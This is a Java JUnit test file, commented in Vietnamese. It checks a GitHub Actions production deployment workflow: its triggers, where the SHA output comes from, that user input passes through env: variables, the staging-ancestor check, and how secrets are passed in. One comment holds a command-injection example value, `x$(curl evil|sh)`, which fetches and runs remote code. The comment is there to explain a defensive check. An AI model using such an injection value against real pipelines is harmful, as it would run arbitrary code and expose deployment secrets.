package com.songnhue.app.deploy;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.fail;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * <b>{@code deploy-prod.yml} — CD Production chạy TỰ ĐỘNG trên push vào {@code production} (T11.86).</b>
 *
 * <h2>Vì sao đổi (06/09/2026)</h2>
 *
 * Tệp ấy cố ý không có trigger {@code push}, với lập luận "đưa lên môi trường thật là một quyết định vận
 * hành, có thời điểm của nó". Lập luận đúng — nhưng nó tính giá cho một chốt an toàn mà thực tế
 * <b>chưa từng được dùng</b>: đo 06/09, {@code CD Production} có <b>0 lượt chạy</b> trong toàn bộ lịch sử
 * kho, trong khi {@code staging} đã qua 30 lượt deploy. Một chốt không ai bấm không bảo vệ được gì; nó chỉ
 * làm chặng cuối khác chặng giữa, và đầu {@code deploy.yml} đã nói khác biệt giữa hai môi trường chính là
 * thứ làm "chạy tốt ở staging" mất hết ý nghĩa.
 *
 * <h2>Ba khuyết tật mà bộ bài này ghi nhớ hộ</h2>
 *
 * <ol>
 *   <li><b>{@code outputs.sha} lấy từ {@code inputs.commit_sha}</b> — trên một lượt {@code push} thì input
 *       ấy là CHUỖI RỖNG, và thân chung sẽ đi tra {@code ghcr.io/…/app:} (tag rỗng) rồi in một 404 kèm ba
 *       bước chẩn đoán trỏ vào ba chỗ đều đang tốt. Hỏng im lặng nhất trong cả bản vá.</li>
 *   <li><b>Biến người dùng nội suy thẳng vào {@code run:}</b> — {@code ${{ inputs.reason }}} chứa
 *       {@code $(…)} sẽ được shell CHẠY. {@code head_commit.message} còn dễ chèn hơn vì nó đến từ một
 *       thông điệp commit.</li>
 *   <li><b>Mất bất biến "đã qua staging"</b> — cây tệp khớp trả lời câu <i>nội dung</i>, không trả lời câu
 *       <i>đã đi qua chặng trước chưa</i>. Cần cả hai.</li>
 * </ol>
 */
class DeployProdTriggerTest {

    private static final Path WORKFLOW = timTuGocKho(".github/workflows/deploy-prod.yml");

    // =========================================================================
    //  Kích hoạt
    // =========================================================================

    @Test
    @DisplayName("⭐⭐ Chạy TỰ ĐỘNG khi có push vào nhánh `production`")
    void chayTuDongTrenPushVaoProduction() {
        String yml = doc(WORKFLOW);

        assertThat(khoiOn(yml))
                .as(
                        """
                        `deploy-prod.yml` không có trigger `push` vào `production`.

                        Trước 06/09 đó là cố ý, và cái giá là 0 lượt CD Production trong suốt lịch sử \
                        kho — chặng cuối chưa từng được kiểm chứng một lần nào.""")
                .contains("push:")
                .containsPattern("branches:\\s*\\[production\\]");
    }

    @Test
    @DisplayName("⭐ Vẫn giữ `workflow_dispatch` — đó là đường QUAY LUI")
    void vanGiuDispatchDeQuayLui() {
        String on = khoiOn(doc(WORKFLOW));

        assertThat(on)
                .as(
                        """
                        Bỏ `workflow_dispatch` là bỏ đường quay lui: §13.1 của \
                        `docs/deploy-production-guideline.md` định nghĩa "quay lui mã nguồn" chính là \
                        chạy lại CD Production với một SHA cũ hơn.""")
                .contains("workflow_dispatch:");

        assertThat(on)
                .as("`commit_sha` phải là tuỳ chọn — để trống nghĩa là triển khai lại đỉnh production")
                .containsPattern("commit_sha:[\\s\\S]{0,300}?required:\\s*false");
        assertThat(on)
                .as("`reason` phải còn bắt buộc — nó là thứ duy nhất tạo ra nhật ký cho lượt bấm tay")
                .containsPattern("reason:[\\s\\S]{0,300}?required:\\s*true");
    }

    // =========================================================================
    //  Khuyết tật im lặng
    // =========================================================================

    @Test
    @DisplayName("⭐⭐ `outputs.sha` phải đến từ một BƯỚC, không từ `inputs.commit_sha`")
    void outputShaPhaiDenTuBuoc() {
        assertThat(khoiOutputs(doc(WORKFLOW)))
                .as(
                        """
                        `kiem-moc.outputs.sha` vẫn lấy thẳng `inputs.commit_sha`.

                        Trên một lượt `push` giá trị ấy là CHUỖI RỖNG. Thân chung sẽ chạy \
                        `docker manifest inspect ghcr.io/<repo>/app:` với tag rỗng và in một 404 kèm \
                        ba bước chẩn đoán trỏ vào ba chỗ đều đang tốt — §10.43, nhưng im lặng hơn vì \
                        lượt chạy vẫn "có vẻ" đang làm đúng việc.""")
                .contains("steps.")
                .doesNotContain("inputs.commit_sha");
    }

    @Test
    @DisplayName("⭐⭐ Biến do người dùng đặt phải đi qua `env:`, không nội suy vào thân `run:`")
    void bienNguoiDungDiQuaEnvKhongNoiVaoRun() {
        // `${{ }}` được thay bằng văn bản TRƯỚC khi shell chạy. Một `reason` là
        // `x$(curl evil|sh)` sẽ được thực thi; `head_commit.message` thì bất kỳ ai mở PR cũng đặt được.
        for (String bien : List.of("inputs.reason", "github.event.head_commit.message")) {
            for (String dong : dongCoBieuThuc(doc(WORKFLOW), bien)) {
                assertThat(dong)
                        .as(
                                """
                                `%s` xuất hiện ở một dòng KHÔNG phải mục `env:`:

                                    %s

                                Nội suy thẳng vào thân `run:` là cho phép chạy lệnh tuỳ ý.""",
                                bien, dong.strip())
                        .matches("^\\s+[A-Z][A-Z0-9_]*:\\s.*");
            }
        }
    }

    @Test
    @DisplayName("⭐ TỰ KIỂM: phép quét trên KHÔNG được chạy qua tập rỗng")
    void tuKiemPhepQuetKhongChayTrenTapRong() {
        // Luật 7: nếu regex bắt hụt thì `dongCoBieuThuc` trả danh sách rỗng và bài trên xanh trọn vẹn
        // mà không khẳng định gì. Hai biến này PHẢI tìm thấy — chúng là đầu vào thật của workflow.
        String yml = doc(WORKFLOW);
        assertThat(dongCoBieuThuc(yml, "inputs.reason"))
                .as("Không tìm thấy `inputs.reason` ở đâu — phép quét đang soi tập rỗng")
                .isNotEmpty();
        assertThat(dongCoBieuThuc(yml, "github.event.head_commit.message"))
                .as("Không tìm thấy `head_commit.message` — lượt push sẽ không có lý do nào trong nhật ký")
                .isNotEmpty();
    }

    // =========================================================================
    //  Bất biến không được mất
    // =========================================================================

    @Test
    @DisplayName("⛔ Giữ bất biến 'đã qua staging' và nạp đủ hai nhánh để kiểm được nó")
    void giuBatBienToTienVaFetchDu() {
        String yml = doc(WORKFLOW);

        assertThat(yml)
                .as(
                        """
                        Mất phép kiểm `--is-ancestor … origin/staging`.

                        Cây tệp khớp chỉ trả lời câu "nội dung này đã dựng image chưa", KHÔNG trả lời \
                        câu "nó đã đi qua staging chưa". Hai câu khác nhau; luồng đã chốt đòi cả hai.""")
                .containsPattern("is-ancestor[^\\n]*origin/staging");

        assertThat(yml)
                .as("Thiếu refspec `dev` — phép giải theo cây tệp sẽ trả 'không tra được' (mã 2)")
                .contains("+refs/heads/dev:refs/remotes/origin/dev");
        assertThat(yml)
                .as("Thiếu refspec `staging` — phép kiểm tổ tiên sẽ chết vì ref không giải được")
                .contains("+refs/heads/staging:refs/remotes/origin/staging");
    }

    @Test
    @DisplayName("⛔ Vẫn truyền đủ NĂM secret `PROD_*` cho thân chung")
    void vanTruyenDuNamSecret() {
        // Thiếu MỘT SỐ secret ⇒ cổng `kiem-secret-may-chu.sh` đỏ ở cả hai môi trường (cấu hình dở dang
        // ≠ chưa dựng). Đây là bất biến mà `DeploySecretWiringTest` cũng canh; giữ ở đây một phép đếm
        // độc lập vì bản vá này viết lại gần trọn tệp.
        assertThat(doc(WORKFLOW).split("secrets\\.PROD_", -1).length - 1)
                .as("Số secret `PROD_*` truyền vào thân chung không còn là 5")
                .isEqualTo(5);
    }

    // =========================================================================

    /** Khối {@code on:} — từ đầu dòng {@code on:} tới khối cấp cao kế tiếp. */
    private static String khoiOn(String yml) {
        int dau = yml.indexOf("\non:");
        if (dau < 0) {
            return "";
        }
        Matcher m = Pattern.compile("\\n(concurrency|permissions|jobs|env):").matcher(yml);
        return m.find(dau + 1) ? yml.substring(dau, m.start()) : yml.substring(dau);
    }

    /** Khối {@code outputs:} của job {@code kiem-moc} — tới dòng {@code steps:} kế tiếp. */
    private static String khoiOutputs(String yml) {
        int dau = yml.indexOf("\n    outputs:");
        if (dau < 0) {
            return "";
        }
        int cuoi = yml.indexOf("\n    steps:", dau);
        String khoi = cuoi < 0 ? yml.substring(dau) : yml.substring(dau, cuoi);
        // Bỏ chú thích: khối này giải thích chính khuyết tật cũ, nên nó CÓ nhắc tên `inputs.commit_sha`
        // trong văn xuôi. Soi cả chú thích là bắt nhầm lời giải thích thành vi phạm.
        return khoi.lines().filter(d -> !d.strip().startsWith("#")).reduce("", (a, b) -> a + "\n" + b);
    }

    /** Mọi dòng MÃ (bỏ chú thích) có chứa biểu thức {@code ${{ … <ten> … }}}. */
    private static List<String> dongCoBieuThuc(String yml, String ten) {
        return yml.lines()
                .filter(d -> !d.strip().startsWith("#"))
                .filter(d -> d.contains("${{") && d.contains(ten))
                .toList();
    }

    private static String doc(Path duongDan) {
        try {
            return Files.readString(duongDan, StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new IllegalStateException("Không đọc được " + duongDan, e);
        }
    }

    private static Path timTuGocKho(String duongDanTuongDoi) {
        Path hienTai = Paths.get(System.getProperty("user.dir")).toAbsolutePath();
        for (int i = 0; i < 6 && hienTai != null; i++) {
            Path ungVien = hienTai.resolve(duongDanTuongDoi);
            if (Files.exists(ungVien)) {
                return ungVien;
            }
            hienTai = hienTai.getParent();
        }
        return fail("Không tìm thấy %s tính từ %s".formatted(duongDanTuongDoi, System.getProperty("user.dir")));
    }
}
